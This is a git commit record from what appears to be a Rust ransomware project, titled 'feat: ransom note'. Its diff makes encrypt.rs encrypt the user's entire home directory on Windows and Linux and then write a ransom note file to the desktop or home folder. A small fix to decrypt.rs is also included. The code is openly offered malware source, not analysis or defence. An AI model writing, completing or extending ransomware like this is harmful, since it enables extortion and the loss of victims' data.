97343c6ca369aa0934a7990c1c463ca4b06ae26f
Xory <xorycode@shuriken.pm>
2024-06-29 13:58:26 +0300

    feat: ransom note

--- src/decrypt.rs
+++ src/decrypt.rs
@@ -7,6 +7,6 @@ fn main() {
     let home: String = env::var("USERPROFILE").unwrap_or("C:\\Users\\Xory".to_string()); // no way this could fail!
     #[cfg(target_os = "linux")]
     let home: String = env::var("HOME").unwrap();
-    decrypt_directory(&home_dir).unwrap();
+    decrypt_directory(&home).unwrap();
     
 }
--- src/encrypt.rs
+++ src/encrypt.rs
@@ -4,12 +4,22 @@ use crypto::register;
 use std::env;
 use std::thread::sleep;
 use std::time::Duration;
+use std::fs::File;
+use std::io::Write;
 
-fn main() {
+const NOTE: &str = include_str!("../note.txt");
+
+fn main() -> std::io::Result<()> {
     #[cfg(target_os = "windows")]
     let home: String = env::var("USERPROFILE").unwrap_or("C:\\Users\\Xory".to_string()); // no way this could fail!
+    #[cfg(target_os = "windows")]
+    let ransomnoteloc = format!("{home}\\Desktop\\README.txt");
+
     #[cfg(target_os = "linux")]
     let home: String = env::var("HOME").unwrap();
+    #[cfg(target_os = "linux")]
+    let ransomnoteloc = format!("{home}/readme.txt");
+
     encrypt_directory(&home).unwrap(); // I know this many unwraps look
                                        // suspicious, but the chance of this
                                        // failing is less than a solar flare.
@@ -22,5 +32,12 @@ fn main() {
             sleep(Duration::from_secs(5));
         }
     }
-    
+
+    // Write ransom note to desktop
+    let mut ransomnote = File::create(ransomnoteloc)?; // we *should* have write perms for
+                                                      // the user's HOME
+    ransomnote.write_all(NOTE.as_bytes())?;
+    ransomnote.flush()?;
+
+    Ok(())
 }
